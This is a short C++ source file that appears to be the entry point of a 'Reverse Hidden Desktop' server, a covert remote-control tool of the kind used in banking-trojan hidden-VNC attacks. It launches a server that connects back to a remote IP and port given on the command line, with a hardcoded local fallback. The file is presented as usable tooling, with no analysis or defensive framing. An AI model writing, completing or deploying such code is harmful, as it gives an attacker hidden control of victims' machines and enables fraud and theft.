#include "Common.h"
#include "ControlWindow.h"
#include "Server.h"




int CALLBACK WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{	
	
	

	AllocConsole();

	freopen("CONIN$", "r", stdin);	
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);

	SetConsoleTitle(TEXT("Hidden Desktop"));

	wprintf(TEXT("Compiled: %S @ %S\n"), __DATE__, __TIME__);
	wprintf(TEXT("Reverse Hidden Desktop: \n\n"));

	//if(!StartServer(atoi(lpCmdLine)))
	if (!StartServer2("127.0.0.1", 6667))
	{
		wprintf(TEXT("Could not start the server (Error: %d)\n"), WSAGetLastError());
			getchar();
			return 0;
	}
	return 0;
}
int main(int argc, char* argv[])
{

	if (argc < 3) {
		printf("Useage Server.exe [remote_ip] [remote_port]\n");
		exit(0);
	}
	int port = atoi(argv[2]);
	printf("Connect to %s:%d\n", argv[1], port);
	StartServer2(argv[1], port);
}